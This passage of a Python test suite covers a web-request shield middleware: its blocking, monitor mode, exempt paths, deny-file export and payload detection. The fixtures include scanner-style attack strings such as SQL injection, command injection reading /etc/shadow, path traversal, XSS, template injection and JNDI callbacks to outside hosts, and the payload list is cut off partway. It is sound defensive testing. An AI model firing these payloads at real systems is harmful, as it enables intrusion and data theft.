            self.assertEqual(s.blocklist(), {}, name)
            for _ in range(5):                                                         # and the visitor carries on
                c.t += 1
                self.assertEqual(visit("/products", "page=2&id=5"), 200, name)

    def test_refusal_is_reported_and_scores_nothing(self):
        events = []
        s, _ = shield(canary_paths=self.canaries, on_event=events.append)
        d = s.check("192.0.2.210", "GET", self.canaries[0], headers=dict(CROSS_SITE_IMAGE, Host="shop.example"))
        self.assertEqual((d.action, d.stop, d.score, d.hits), ("refuse", True, 0.0, ["decoy:canary-path"]))
        self.assertTrue(d.induced)
        self.assertEqual(events[-1]["action"], "refuse")
        self.assertEqual(s.stats["refused"], 1)
        self.assertEqual((s.stats["blocked"], s.stats["throttled"]), (0, 0))
        self.assertNotIn("192.0.2.210", s._tracks)

    def test_nothing_another_page_forces_is_held_against_the_visitor(self):
        for name, headers in INDUCED.items():
            s, c = shield(canary_paths=self.canaries)
            visit = wsgi_site(s)
            forced = [(self.canaries[1], ""), ("/.env", ""), ("/search", "q=%3Cscript%3Ealert(1)%3C/script%3E"),
                      ("/item", "id=1%27%20UNION%20SELECT%20null--"), ("/db-backup.sql", "")]
            forced += [(p, "") for p in ("/admin", "/wp-login.php", "/phpmyadmin/", "/console", "/actuator/env")]
            forced += [(f"/junk-{i}", "") for i in range(60)]         # sixty dead paths
            forced += [("/", "")] * 600                               # and a flood
            for path, query in forced:
                c.t += 0.01
                self.assertIn(visit(path, query, headers), (200, 403, 404), f"{name}: {path}")
            self.assertEqual(s.blocklist(), {}, name)
            self.assertNotIn("192.0.2.200", s._tracks, name)
            for _ in range(5):
                c.t += 1
                self.assertEqual(visit("/products"), 200, name)

    def test_referer_carrying_a_callback_marker_does_not_block_the_visitor(self):
        s, c = shield()
        visit = wsgi_site(s)
        evil = dict(CROSS_SITE_IMAGE, Referer="https://forum.example/?x=${jndi:ldap://c9abc.oast.fun/a}")
        self.assertEqual(visit("/", headers=evil), 403)
        self.assertEqual(visit("/"), 200)
        self.assertEqual(s.blocklist(), {})

    def test_a_forged_marker_gets_no_attack_request_through(self):
        s, c = shield(canary_paths=self.canaries)
        visit = wsgi_site(s)
        attacks = [("/item", "id=1%27%20UNION%20SELECT%20null--"), ("/search", "q=%3Csvg%20onload=alert(1)%3E"),
                   ("/view", "file=..%2f..%2f..%2fetc%2fpasswd"), ("/ping", "host=x%3Bcat%20%2Fetc%2Fshadow"),
                   ("/.env", ""), ("/.git/config", ""), (self.canaries[0], "")]
        for name, headers in INDUCED.items():
            for path, query in attacks * 3:
                c.t += 0.2
                self.assertEqual(visit(path, query, headers), 403, f"{name}: {path}?{query}")
            self.assertEqual(visit("/", headers=dict(headers, **{"User-Agent": "sqlmap/1.9"})), 403, name)

    def test_the_visitors_own_requests_are_scored_as_before(self):
        for name, headers in DIRECT.items():
            s, c = shield(canary_paths=self.canaries)
            visit = wsgi_site(s)
            self.assertEqual(visit("/item", "id=1%27%20UNION%20SELECT%20null--", headers), 429, name)
            self.assertEqual(visit(self.canaries[0], headers=headers), 403, name)
            self.assertIn("192.0.2.200", s.blocklist(), name)
            self.assertEqual(visit("/"), 403, name)
        s, c = shield()
        visit = wsgi_site(s)
        for i in range(15):                       # and their 404s still count
            c.t += 1
            visit(f"/guess-{i}", headers=DIRECT["typed"])
        self.assertEqual(s._tracks["192.0.2.200"].score, 40)

    def test_scoring_induced_requests_can_be_switched_back_on(self):
        s, _ = shield(canary_paths=self.canaries, score_induced=True)
        visit = wsgi_site(s)
        self.assertEqual(visit(self.canaries[0], headers=CROSS_SITE_IMAGE), 403)
        self.assertIn("192.0.2.200", s.blocklist())

    def test_a_blocked_address_stays_blocked_whatever_it_claims(self):
        s, _ = shield()
        visit = wsgi_site(s)
        self.assertEqual(visit("/", headers={"User-Agent": "sqlmap/1.9"}), 403)
        for name, headers in INDUCED.items():
            self.assertEqual(visit("/", headers=headers), 403, name)

    def test_asgi_passes_the_context_through(self):
        async def app(scope, receive, send):
            await send({"type": "http.response.start", "status": 404, "headers": []})
            await send({"type": "http.response.body", "body": b""})

        s, _ = shield(canary_paths=self.canaries)
        wrapped = ShieldASGI(app, s)

        async def call(path, extra=()):
            sent = []
            scope = {"type": "http", "method": "GET", "path": path, "query_string": b"",
                     "client": ("192.0.2.220", 5555),
                     "headers": [(b"host", b"shop.example"), (b"user-agent", CHROME.encode()),
                                 (b"accept-language", b"en")] + list(extra)}

            async def send(m):
                sent.append(m)

            await wrapped(scope, None, send)
            return sent[0]["status"]

        embedded = [(b"sec-fetch-site", b"cross-site"), (b"sec-fetch-dest", b"image")]
        self.assertEqual(asyncio.run(call(self.canaries[0], embedded)), 403)
        for i in range(40):
            self.assertEqual(asyncio.run(call(f"/junk-{i}", embedded)), 404)
        self.assertEqual(s.blocklist(), {})
        self.assertNotIn("192.0.2.220", s._tracks)


class MonitorMode(unittest.TestCase):
    """Issue 13: monitor mode has to report what enforce mode would do."""

    def test_a_client_never_told_to_wait_is_not_ignoring_the_wait(self):
        events = []
        s, c = shield(mode="monitor", on_event=events.append)
        self.assertEqual(s.check("192.0.2.230", "GET", "/.env", headers=BROWSER).action, "throttle")
        for _ in range(40):                       # it got a normal answer, so it keeps browsing
            c.t += 1
            d = s.check("192.0.2.230", "GET", "/", headers=BROWSER)
            self.assertEqual((d.action, d.stop), ("throttle", False))
        self.assertEqual(s.blocklist(), {})
        self.assertNotIn("behavior:ignored-retry-after", [h for e in events for h in e["hits"]])
        c.t += 600                                # and the score decays as it would have
        self.assertEqual(s.check("192.0.2.230", "GET", "/", headers=BROWSER).action, "pass")

    def test_enforce_mode_still_escalates_a_client_that_ignores_the_wait(self):
        s, c = shield()
        s.check("192.0.2.231", "GET", "/.env", headers=BROWSER)
        for _ in range(12):
            c.t += 1
            d = s.check("192.0.2.231", "GET", "/", headers=BROWSER)
        self.assertEqual(d.action, "block")

    def test_a_would_be_blocked_address_is_still_reported(self):
        events = []
        s, c = shield(mode="monitor", on_event=events.append)
        s.check("203.0.113.80", "GET", "/", headers={"User-Agent": "sqlmap/1.9"})
        self.assertEqual([e["action"] for e in events], ["block"])
        c.t += 5                                  # it was not stopped, so it carries on
        d = s.check("203.0.113.80", "GET", "/item", "id=1%27%20UNION%20SELECT%20null--", BROWSER)
        self.assertEqual((d.action, d.stop, d.hits), ("block", False, ["blocklist", "payload:sqli"]))
        self.assertEqual((events[-1]["action"], events[-1]["enforced"]), ("blocked", False))
        self.assertEqual(events[-1]["hits"], ["blocklist", "payload:sqli"])
        # Quiet requests are reported too, once per half-life: a person browsing
        # on while "blocked" is how a false positive shows up.
        before = len(events)
        for _ in range(50):
            c.t += 1
            self.assertEqual(s.check("203.0.113.80", "GET", "/", headers=BROWSER).hits, ["blocklist"])
        self.assertEqual(len(events), before + 1)
        self.assertEqual(events[-1]["hits"], ["blocklist"])
        for _ in range(50):                       # a soft signal alone does not make every request an event
            c.t += 1
            s.check("203.0.113.80", "GET", "/", headers={"User-Agent": "python-requests/2.32"})
        self.assertEqual(len(events), before + 1)
        # None of it changes what enforce mode would have done: one block, one hour.
        self.assertEqual((s.stats["blocked"], s._tracks["203.0.113.80"].strikes), (1, 1))
        self.assertEqual(s._tracks["203.0.113.80"].score, 0)
        c.t += 3600
        self.assertEqual(s.check("203.0.113.80", "GET", "/", headers=BROWSER).action, "pass")

    def test_enforce_mode_does_not_report_requests_it_refuses_by_block(self):
        events = []
        s, c = shield(on_event=events.append)
        s.check("203.0.113.81", "GET", "/", headers={"User-Agent": "sqlmap/1.9"})
        d = s.check("203.0.113.81", "GET", "/item", "id=1%27%20UNION%20SELECT%20null--", BROWSER)
        self.assertEqual((d.action, d.hits), ("block", ["blocklist"]))
        self.assertEqual(len(events), 1)


class ExemptPaths(unittest.TestCase):
    """Issue 14: an exemption covers a path and what is under it, nothing else."""
    BAD = {"User-Agent": "sqlmap/1.9"}

    def test_exemption_stops_at_the_segment_boundary(self):
        s, _ = shield(exempt_paths=["/static", "/healthz", "/assets/"])
        for path in ["/static", "/static/", "/static/app.js", "/static/css/site.css", "/healthz", "/assets/logo.png",
                     "/assets"]:
            self.assertEqual(s.check("203.0.113.90", "GET", path, headers=self.BAD).action, "pass", path)
        for path in ["/static-admin/users", "/staticfiles", "/healthz-internal", "/healthzz", "/assetsx",
                     "/api/static/x", "/static/../api/items", "/static/..%2fapi/items", "/static/%2e%2e/api/items",
                     "/static/..\\api", "/%73tatic/app.js", "/static/.."]:
            s2, _ = shield(exempt_paths=["/static", "/healthz", "/assets/"])
            self.assertEqual(s2.check("203.0.113.91", "GET", path, headers=self.BAD).action, "block", path)

    def test_a_climb_in_another_servers_spelling_is_under_nothing(self):
        # Tomcat, Jetty and Spring drop ";param" from a segment, so "..;" climbs
        # there; some servers stop at a NUL, or trim dots and spaces.
        for path in ["/static/..;/api/items", "/static/..;jsessionid=1/api", "/static/%2e%2e;/api", "/static/..%00/api",
                     "/static/.../api", "/static/.. /api", "/static/..+/api", "/static/..;", "/static/%252e%252e;/api"]:
            s, _ = shield(exempt_paths=["/static"])
            self.assertEqual(s.check("203.0.113.92", "GET", path, headers=self.BAD).action, "block", path)
        s, _ = shield(exempt_paths=["/static"])
        for path in ["/static/app.js;v=2", "/static/..x/a.js", "/static/a..b.css", "/static/.well-known", "/static/x..",
                     "/static/./app.js"]:
            self.assertEqual(s.check("203.0.113.93", "GET", path, headers=self.BAD).action, "pass", path)

    def test_a_blocked_client_stays_blocked_on_an_exempt_path(self):
        for mode in ("enforce", "monitor"):
            s, _ = shield(mode=mode, exempt_paths=["/static"])
            self.assertEqual(s.check("203.0.113.94", "GET", "/static/app.js", headers=BROWSER).action, "pass")
            s.check("203.0.113.94", "GET", "/", headers=self.BAD)                     # blocked for this
            d = s.check("203.0.113.94", "GET", "/static/app.js", headers=BROWSER)
            self.assertEqual((d.action, d.hits, d.stop), ("block", ["blocklist"], mode == "enforce"), mode)
            self.assertEqual(s._tracks["203.0.113.94"].score, 0, mode)                # and still not scored there
            self.assertEqual(s.check("203.0.113.95", "GET", "/static/app.js", headers=self.BAD).action, "pass", mode)

    def test_an_allowlisted_address_is_never_blocked_even_inside_a_blocked_network(self):
        s, _ = shield(allow_cidrs=["2001:db8:7:1::/64"], exempt_paths=["/static"], v6_escalate_after=2)
        for net in ("2001:db8:7:2::1", "2001:db8:7:3::1"):                       # two /64s: their /56 is blocked
            s.check(net, "GET", "/", headers=self.BAD)
        self.assertIn("2001:db8:7::/56", s.blocklist())
        self.assertEqual(s.check("2001:db8:7:4::1", "GET", "/static/app.js", headers=BROWSER).action, "block")
        for path in ("/", "/static/app.js"):
            self.assertEqual(s.check("2001:db8:7:1::1", "GET", path, headers=BROWSER).action, "pass", path)

    def test_404s_next_to_an_exempt_path_are_still_counted(self):
        s, c = shield(exempt_paths=["/static"])
        visit = wsgi_site(s)
        for i in range(15):
            c.t += 1
            visit(f"/static-old/guess-{i}")
        self.assertEqual(s._tracks["192.0.2.200"].score, 40)

    def test_exemptions_that_would_cover_everything_are_refused(self):
        for bad in ["", "/", "//", "static", " /static", "*"]:
            with self.assertRaises(ValueError, msg=repr(bad)):
                Config(exempt_paths=[bad])
        with self.assertRaises(ValueError):
            Config(exempt_paths="/static")        # a bare string would be read letter by letter
        Config(exempt_paths=["/static", "/healthz/"])


SCANNER = {"User-Agent": "sqlmap/1.9"}


class Export(unittest.TestCase):
    """Issue 8: the deny file is what the edge enforces, so it has to be right."""

    def setUp(self):
        self.dir = tempfile.TemporaryDirectory()
        self.addCleanup(self.dir.cleanup)
        self.path = os.path.join(self.dir.name, "deny.conf")

    def read(self):
        with open(self.path) as f:
            return f.read()

    def test_workers_sharing_a_file_keep_each_others_blocks(self):
        a, _ = shield(blocklist_export_path=self.path)            # two worker processes, one file
        b, _ = shield(blocklist_export_path=self.path)
        a.check("203.0.113.1", "GET", "/", headers=SCANNER)
        b.check("203.0.113.2", "GET", "/", headers=SCANNER)
        a.check("2001:db8::1", "GET", "/", headers=SCANNER)
        self.assertEqual(self.read(), "deny 2001:db8::/64;\ndeny 203.0.113.1;\ndeny 203.0.113.2;\n")

    def test_expired_blocks_leave_the_file(self):
        s, c = shield(blocklist_export_path=self.path)
        s.check("203.0.113.3", "GET", "/", headers=SCANNER)
        c.t += 1800
        s.check("203.0.113.4", "GET", "/", headers=SCANNER)
        self.assertEqual(self.read(), "deny 203.0.113.3;\ndeny 203.0.113.4;\n")
        c.t += 1801                               # the first block is over; any request notices
        s.check("198.51.100.5", "GET", "/", headers=BROWSER)
        self.assertEqual(self.read(), "deny 203.0.113.4;\n")
        c.t += 1800
        s.check("198.51.100.5", "GET", "/", headers=BROWSER)
        self.assertEqual(self.read(), "")

    def test_another_workers_expired_block_leaves_the_file_too(self):
        a, ca = shield(blocklist_export_path=self.path)
        b, cb = shield(blocklist_export_path=self.path)
        a.check("203.0.113.5", "GET", "/", headers=SCANNER)
        ca.t += 4000
        cb.t += 4000                              # worker A has gone quiet; B serves the next request
        b.check("198.51.100.6", "GET", "/", headers=BROWSER)
        b.check("203.0.113.6", "GET", "/", headers=SCANNER)
        self.assertEqual(self.read(), "deny 203.0.113.6;\n")

    def test_unblock_leaves_the_file(self):
        s, _ = shield(blocklist_export_path=self.path)
        s.check("203.0.113.7", "GET", "/", headers=SCANNER)
        s.check("203.0.113.8", "GET", "/", headers=SCANNER)
        self.assertTrue(s.unblock("203.0.113.7"))
        self.assertEqual(self.read(), "deny 203.0.113.8;\n")

    def test_only_networks_are_written(self):
        with open(self.path + ".state", "w") as f:                # whatever was left behind
            f.write('{"invalid": 9999999999, "deny all": 9999999999, "203.0.113.9": "soon", "198.51.100.0/24": 9999999999}')
        s, _ = shield(blocklist_export_path=self.path)
        s.check("not-an-address", "GET", "/", headers=SCANNER)
        s.check("203.0.113.10", "GET", "/", headers=SCANNER)
        self.assertEqual(self.read(), "deny 198.51.100.0/24;\ndeny 203.0.113.10;\n")
        with open(self.path + ".state", "w") as f:
            f.write("not json at all")
        s.check("203.0.113.11", "GET", "/", headers=SCANNER)
        self.assertEqual(self.read(), "deny 203.0.113.10;\ndeny 203.0.113.11;\n")

    def test_plain_format_and_return_value(self):
        s, _ = shield()
        s.check("203.0.113.12", "GET", "/", headers=SCANNER)
        self.assertEqual(s.export_blocklist(self.path, "plain"), 1)
        self.assertEqual(self.read(), "203.0.113.12\n")

    def test_expiry_reaches_the_file_without_another_request(self):
        s = Shield(Config(mode="enforce", blocklist_export_path=self.path, block_ttl=0.4))    # real clock
        s.check("203.0.113.13", "GET", "/", headers=SCANNER)
        self.assertEqual(self.read(), "deny 203.0.113.13;\n")
        deadline = time.time() + 5
        while self.read() and time.time() < deadline:
            time.sleep(0.05)
        self.assertEqual(self.read(), "")


class BlockTable(unittest.TestCase):
    """Issue 11: blocks are bounded, and changing IPv6 network is not a fresh start."""

    def test_block_table_is_capped(self):
        s, _ = shield(max_blocks=500, max_tracks=100)
        for i in range(5000):
            s.check(f"100.{64 + (i >> 16)}.{(i >> 8) & 255}.{i & 255}", "GET", "/", headers=SCANNER)
        self.assertLessEqual(len(s._blocks), 500)
        self.assertLessEqual(len(s.blocklist()), 500)
        self.assertEqual(s.check("100.64.19.135", "GET", "/", headers=BROWSER).action, "block")    # the latest stays
        with self.assertRaises(ValueError):
            Config(max_blocks=0)

    def test_expired_blocks_are_dropped_without_being_asked_for(self):
        s, c = shield()
        for i in range(300):
            s.check(f"100.64.{1 + i // 250}.{i % 250}", "GET", "/", headers=SCANNER)
        self.assertEqual(len(s._blocks), 300)
        c.t += 3 * 3600                           # nobody calls blocklist(); those addresses never return
        s.check("100.64.9.9", "GET", "/", headers=SCANNER)
        self.assertEqual(len(s._blocks), 1)

    def test_rotating_ipv6_networks_gets_the_wider_prefix_blocked(self):
        s, c = shield(v6_escalate_after=8)
        for i in range(7):
            s.check(f"2001:db8:5:{i:x}::1", "GET", "/", headers=SCANNER)
        self.assertEqual(s.check("2001:db8:5:99::7", "GET", "/", headers=BROWSER).action, "pass")   # seven: not yet
        s.check("2001:db8:5:7::1", "GET", "/", headers=SCANNER)                                    # the eighth
        self.assertEqual(list(s.blocklist()), ["2001:db8:5::/56"])          # one entry stands for all of them
        for fresh in ["2001:db8:5:98::7", "2001:db8:5:ff::1", "2001:db8:5:3::2"]:
            self.assertEqual(s.check(fresh, "GET", "/", headers=BROWSER).action, "block", fresh)
        self.assertEqual(s.check("2001:db8:5:100::7", "GET", "/", headers=BROWSER).action, "pass")  # the next /56
        self.assertEqual(s.check("192.0.2.5", "GET", "/", headers=BROWSER).action, "pass")
        c.t += 3601
        self.assertEqual(s.check("2001:db8:5:98::7", "GET", "/", headers=BROWSER).action, "pass")
        self.assertEqual(s.blocklist(), {})

    def test_rotation_across_wider_networks_escalates_again(self):
        s, _ = shield(v6_escalate_after=8)
        for net in range(8):                      # eight /56s, eight /64s in each
            for i in range(8):
                s.check(f"2001:db8:6:{net:x}{i:02x}::1", "GET", "/", headers=SCANNER)
        self.assertEqual(list(s.blocklist()), ["2001:db8:6::/48"])
        self.assertEqual(s.check("2001:db8:6:f00d::1", "GET", "/", headers=BROWSER).action, "block")
        self.assertEqual(s.check("2001:db8:7::1", "GET", "/", headers=BROWSER).action, "pass")
        self.assertTrue(s.unblock("2001:db8:6:f00d::1"))                 # lifting it for one address lifts the prefix
        self.assertEqual(s.check("2001:db8:6:f00d::1", "GET", "/", headers=BROWSER).action, "pass")

    def test_widening_is_off_by_default(self):
        # A /56 or /48 can hold hundreds of a provider's customers, so blocking
        # one is something an operator must ask for.
        self.assertEqual(Config().v6_escalate_after, 0)
        for s, _ in (shield(), shield(v6_escalate_after=0)):
            for i in range(40):
                s.check(f"2001:db8:5:{i:x}::1", "GET", "/", headers=SCANNER)
            self.assertEqual(len(s.blocklist()), 40)
            self.assertTrue(all(net.endswith("/64") for net in s.blocklist()))
            self.assertEqual(s.check("2001:db8:5:99::7", "GET", "/", headers=BROWSER).action, "pass")
        with self.assertRaises(ValueError):
            Config(v6_escalate_after=1)

    def test_neighbours_of_a_few_blocked_networks_are_untouched(self):
        s, c = shield(v6_escalate_after=8)
        for i in range(3):
            s.check(f"2001:db8:8:{i:x}::1", "GET", "/", headers=SCANNER)
        for i in range(16, 200):                  # the rest of the street
            c.t += 1
            self.assertEqual(s.check(f"2001:db8:8:{i:x}::1", "GET", "/", headers=BROWSER).action, "pass")


class History(unittest.TestCase):
    """Issue 16: a flood limit above 512 used to be silently ignored."""

    def test_large_rate_limit_still_fires(self):
        s, c = shield(rate_limit=600)
        hits = []
        for _ in range(5000):
            c.t += 0.01
            hits += s.check("192.0.2.240", "GET", "/", headers=BROWSER).hits
        self.assertIn("behavior:request-flood", hits)

    def test_limits_must_be_positive(self):
        for bad in [{"rate_limit": 0}, {"cadence_samples": 1}, {"half_life": 0}, {"enum_404_threshold": 0}]:
            with self.assertRaises(ValueError, msg=bad):
                Config(**bad)


class Delivery(unittest.TestCase):
    """Issue 17: logging, the callback and the file write must not hold up other requests."""

    def test_nothing_is_delivered_while_the_lock_is_held(self):
        free = []

        def probe(where):
            def try_lock():
                got = s._lock.acquire(blocking=False)
                if got:
                    s._lock.release()
                free.append((where, got))
            other = threading.Thread(target=try_lock)
            other.start()
            other.join()

        class Handler(logging.Handler):
            def emit(self, record):
                probe("log")

        log = logging.getLogger("artex_shield.delivery")
        log.propagate = False
        handler = Handler()
        log.addHandler(handler)
        self.addCleanup(log.removeHandler, handler)
        real_replace = os.replace

        def replace(src, dst):
            probe("export")
            return real_replace(src, dst)

        with tempfile.TemporaryDirectory() as d:
            s, c = shield(logger="artex_shield.delivery", on_event=lambda e: probe("callback:" + e["action"]),
                          blocklist_export_path=os.path.join(d, "deny.conf"))
            with mock.patch("artex_shield.util.os.replace", replace):     # where the export writes
                s.check("192.0.2.241", "GET", "/.env", headers=BROWSER)              # throttle
                s.check("203.0.113.100", "GET", "/", headers=SCANNER)               # block, and an export
                s.check("192.0.2.242", "GET", "/", headers=BROWSER)
                s.observe("192.0.2.242", "/swagger.json", 404)                      # score, from observe()
                s.unblock("203.0.113.100")                                           # another export
        seen = {where for where, _ in free}
        self.assertTrue({"log", "export", "callback:throttle", "callback:block", "callback:score"} <= seen, seen)
        self.assertEqual([where for where, got in free if not got], [])

    def test_callback_can_use_the_shield(self):
        seen = []
        s, _ = shield(on_event=lambda e: seen.append((e["action"], sorted(s.blocklist()), s.unblock(e["ip"]))))
        s.check("203.0.113.101", "GET", "/", headers=SCANNER)
        self.assertEqual(seen, [("block", ["203.0.113.101"], True)])
        self.assertEqual(s.check("203.0.113.101", "GET", "/", headers=BROWSER).action, "pass")


class Evasions(unittest.TestCase):
    """Issue 9: the usual ways round a payload pattern."""

    def hits(self, query, headers=BROWSER, path="/item"):
        s, _ = shield()
        return s.check("203.0.113.110", "GET", path, query, headers).hits

    def test_evasions_are_scored(self):
        cases = {
            "payload:sqli": ["id=1/**/UNION/**/SELECT/**/null--", "id=1/*x*/UNION/*y*/ALL/**/SELECT+1",
                             "id=1+/*!50000UNION*/+/*!50000SELECT*/+1", "id=1%27or%271%27=%271", "id=1%22or%221%22=%221",
                             "id=1+OR+1=1", "id=1+and+1=2--", "id=1%27+OR+%27a%27=%27a"],
            "payload:cmdi": ["host=x%0Auname+-a", "host=x%0D%0Awhoami", "host=$(sleep+5)", "host=%60sleep+5%60",
                             "host=x;sleep+5", "host=x|ls+-la", "host=x%26ping+-c+1+198.51.100.1", "host=%60ls+-la%60",
                             "host=x%0acat+/tmp/k", "host=$(ls)", "host=x%7C%7Csleep+9"],
            "payload:xss": ["q=<details+open+ontoggle=alert(1)>", "q=%22+onpointerenter=alert(1)+x=%22",
                            "q=<svg/onanimationstart=alert(1)>", "q=<body+onpageshow=alert(1)>", "q=<x+onclick=alert(1)>"],
            "payload:ssti": ["name={{config}}", "name={{7*'7'}}", "name={{+request.application.__globals__+}}",
                             "name=${T(java.lang.Runtime).getRuntime()}", "name=%23{7*7}", "name={{self}}",
                             "name={{config.items()}}", "name={{self.__init__.__globals__}}", "name={{request|attr('x')}}"],
        }
        for label, queries in cases.items():
            for q in queries:
                self.assertIn(label, self.hits(q), q)

    def test_callback_markers_are_found_anywhere_in_the_headers(self):
        jndi = "${jndi:ldap://c9abc.oast.fun/a}"
        for name, extra in {"cookie": {"Cookie": "sid=abc123; theme=" + jndi},
                            "after padding": {"X-Api-Version": "a" * 5000 + jndi},
                            "last of many": dict({f"X-Pad-{i}": "b" * 3000 for i in range(20)}, **{"X-Trace": jndi}),
                            "nested lookup in a cookie": {"Cookie": "c=${${::-j}ndi:rmi://198.51.100.1/x}"}}.items():
            self.assertIn("payload:jndi", self.hits("", dict(BROWSER, **extra)), name)
        self.assertIn("payload:oob-callback", self.hits("", dict(BROWSER, Cookie="next=//x7.interact.sh/p")))

    def test_ordinary_text_is_still_not_a_payload(self):
        for q in ["q=cats+and+dogs", "q=rock+and+roll+1999", "q=1+or+2+bedrooms", "filter=price%3D10+or+price%3D20",
                  "next=%2Flist%3Fonline%3D1%26onsale%3Dtrue", "onclick=track&onchange=1&online=1", "q=only+one=1",
                  "email=%7B%7Bemail%7D%7D&name=%7B%7B+first_name+%7D%7D", "notes=line+one%0Aline+two%0Aidea+three",
                  "q=sleep+well+tonight", "q=ping+pong+tables", "path=/usr/local/*.txt&glob=/*/*", "q=a/*b", "c=/*",
                  "tpl=${name}+${count}", "q=configuration+self+request", "comment=great+product+%231+choice",
                  "title=War+and+Peace&price=10", "q=ls&sort=id", "tags=shell|bash|ls", "cols=name%0D%0Aid%0D%0Aprice",
                  "note=shopping%0Acat+food%0Als+the+folder", "q=what+does+%60ls%60+do", "q=use+onclick%3D+in+html",
                  "q=set+onchange%3Dx", "theme=%7B%7B+settings.theme+%7D%7D", "t=%7B%7B+config.site_name+%7D%7D",
                  "q=a+%3C+b+onclick%3D1", "q=it%27s+online%3D1"]:
            self.assertEqual(self.hits(q, path="/search"), [], q)
        ordinary = dict(BROWSER, Cookie="sid=4f9c2a; _ga=GA1.2.1234.5678; consent=%7B%22ads%22%3Afalse%7D; "
                                        "last=%2Fsearch%3Fq%3Dsleep%2B(8%2Bhours); cart=3|17|42; lang=en-US")
        self.assertEqual(self.hits("page=2&id=5", ordinary, "/products"), [])

    def test_headers_are_searched_for_callback_markers_only(self):
        # A single-page app puts whatever the person typed into the address bar
        # without asking the server, and every later request repeats it as the
        # Referer. Text that would score once in a URL must not score there on
        # every request, so headers are not searched for ordinary payloads.
        typed = dict(BROWSER, Referer="https://shop.example/search?q=1' UNION SELECT null--", Host="shop.example",
                     Cookie="last=<script>alert(1)</script>")
        self.assertEqual(self.hits("", typed), [])


# What people type into a search box. Every one of these used to score as an
# attack payload: a book with a colon or a year in brackets, quoted titles
# joined by "and", recipes with apostrophes, programming questions.
EVERYDAY_SEARCHES = [
    # books
    "javascript: the good parts", "JavaScript: The Definitive Guide (7th edition)",
    "javascript: understanding the weird parts (course)", "Why We Sleep (2017) Matthew Walker",
    "'Salem's Lot", "'Dune' and '1984'", "'The Road' or 'Blood Meridian'", '"Catch-22" and "Slaughterhouse-Five"',
    "Harry Potter and the Philosopher's Stone", "The Hitchhiker's Guide to the Galaxy", "'Tis: A Memoir",
    "Charlotte's Web or Stuart Little", '"Pride and Prejudice" or "Emma"', "Don't Make Me Think (2nd edition)",
    "O'Reilly 'Learning Python' or 'Fluent Python'", "Tolkien 'The Hobbit' and 3 other books",
    "'Night Shift' or 'Skeleton Crew' stephen king", "Rock 'n' Roll: A Social History",
    "'Dune' or true crime", "'It' and 'Carrie' (1976 film)",
    # recipes
    "chicken tikka masala (serves 4)", "mac 'n' cheese", "grandma's apple pie", "salt & pepper squid",
    "bake at 350°F (175°C) for 25-30 min", "1/2 cup sugar; 2 eggs; 1 tsp vanilla", "slow cooker chili | easy | 8 hours",
    "shepherd's pie or cottage pie", "meal plan for 3 kids' and 2 adults", "fish 'n' chips", "s'mores without a campfire",
    "'no knead' bread or focaccia", "eggs benedict & hollandaise (blender)", "sourdough starter (day 1)",
    "'salt' and 'pepper' to taste", "brownies 9x13 (serves 12-16)", "2 eggs or 1 banana as substitute",
    # everyday
    "sleep (8 hours)", "how much sleep (7-9 hours) do adults need", "benchmark (2024) gpu",
    "student union select committee", "credit union select checking account",
    # programming questions
    "how to use <script tags in html", "<script async vs defer", "what does the <script> tag do",
    "python time.sleep(5) not working", "how to sleep 5 seconds in bash", "sql union select example",
    "sql union all select vs union", "mysql information_schema.tables size", "waitfor delay sql server example",
    "window.onload = function vs DOMContentLoaded", "img onerror= fallback image", "<iframe> embed youtube responsive",
    '<svg viewBox="0 0 24 24"> icon size', "jest cannot find module '../../utils'", "import styles from '../../theme.css'",
    "difference between == and === in javascript", "rust Option<T> unwrap vs expect", "c++ std::vector<int> push_back",
    "regex lookahead (?=...) example", "bash if [ -f file ]; then echo exists", "git log --oneline && git status",
    'href="javascript:void(0)" meaning', "jinja2 {{ variable|default('none') }}", "flask {{ config.SECRET_KEY }} in template",
    "find . -name '*.py' | xargs grep TODO", "python f'{name!r}' formatting", "sql where 1=1 meaning",
    "kubectl get pods -o wide | grep Running", "node fetch('/api').then(res => res.json())", "css :not(.active) selector",
    "powershell Get-ChildItem | Select-Object Name", "typescript Record<string, number>", "cron */5 * * * * every 5 minutes",
    "geekbench cpu benchmark(single core)", "<button onclick= not working", "sleep sort algorithm (joke)",
]

# Payloads from scanners and the usual cheat sheets. They must all still be
# caught, including the forms the search-text fix had to tell apart.
ATTACK_PAYLOADS = {
    "payload:sqli": [
        "1' OR '1'='1", "' OR '1'='1' --", "' OR 1=1--", '" OR "1"="1', "' OR 'a'='a", "') OR ('1'='1",
        "admin' OR 1=1#", "1 OR 1=1", "1' AND 1=1--", "1' AND 1=2--", "1 AND 1=2", "' OR ''='", "x' or 1 or 'x",
        "' or '1", "' or true--", "' or 1--", "' or 2>1--", "' and substring(@@version,1,1)='5", "' or exists(select 1)--",
        "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL,NULL--", "1 UNION ALL SELECT 1,2,3", "-1 union select 1",
        "-1 UNION SELECT username,password FROM users--", "' UNION SELECT @@version--",
        "1' UNION SELECT table_name FROM information_schema.tables--", "1 UNION/**/SELECT/**/1,2",
        "1/**/UNION/**/ALL/**/SELECT/**/NULL", "1 AND SLEEP(5)", "1' AND SLEEP(5)--", "'||pg_sleep(5)--",
        "1; SELECT pg_sleep(5)--", "1); WAITFOR DELAY '0:0:5'--", "1 AND BENCHMARK(5000000,MD5(1))",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", "IF(1=1,SLEEP(5),0)", "sleep(5)",
        "1 AND extractvalue(1,concat(0x7e,version()))", "1 AND updatexml(1,concat(0x7e,user()),1)",
        "'; EXEC xp_cmdshell('whoami')--", "' AND 1=CONVERT(int,(SELECT @@version))--", "%' AND 1=1 AND '%'='",
        "1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)",
    ],
    "payload:xss": [
        "<script>alert(1)</script>", '"><script>alert(1)</script>', "<script>alert(document.domain)</script>",
        "<ScRiPt>alert(1)</sCrIpT>", "<script src=//xss.example/x.js></script>", "<script/src=data:,alert(1)>",
        "</script><script>alert(1)</script>", "<scr<script>ipt>alert(1)</scr</script>ipt>", "<svg><script>alert(1)</script>",
        "<img src=x onerror=alert(1)>", '"><img src=x onerror=alert(1)>', "<svg onload=alert(1)>", "<svg/onload=alert(1)>",
        "<body onload=alert(1)>", '<iframe src="javascript:alert(1)">', '<iframe srcdoc="&lt;script&gt;alert(1)">',
        "<iframe src=//evil.example>", "javascript:alert(1)", "javascript:alert(document.cookie)", "JaVaScRiPt:alert(1)",
